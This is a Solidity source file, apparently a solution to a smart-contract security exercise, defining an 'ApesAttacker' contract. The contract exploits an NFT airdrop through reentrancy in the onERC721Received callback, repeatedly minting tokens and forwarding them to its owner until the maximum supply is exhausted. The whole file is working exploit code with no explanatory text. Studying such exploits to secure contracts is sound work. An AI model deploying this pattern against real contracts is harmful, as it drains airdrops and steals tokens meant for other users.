// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IApesAirdrop {
    function mint() external returns (uint16);

    function maxSupply() external returns (uint16);

    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract ApesAttacker {
    IApesAirdrop immutable apesAirDropContract;
    address immutable owner;

    address immutable attacker;

    constructor(address _apesAirDropContract, address _attacker) {
        apesAirDropContract = IApesAirdrop(_apesAirDropContract);
        owner = msg.sender;
        attacker = _attacker;
    }

    function attack() public {
        uint16 _id = apesAirDropContract.mint();
        apesAirDropContract.transferFrom(address(this), owner, _id);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        // @audit This is forwarded 
        bytes calldata data
    ) external returns (bytes4) {
        // Handle the received token here...
        if (_tokenId < apesAirDropContract.maxSupply()) {
            uint16 _id = apesAirDropContract.mint();
            apesAirDropContract.transferFrom(address(this), owner, _id);
            return this.onERC721Received.selector;
        } else {
            return this.onERC721Received.selector;
        }
    }
}
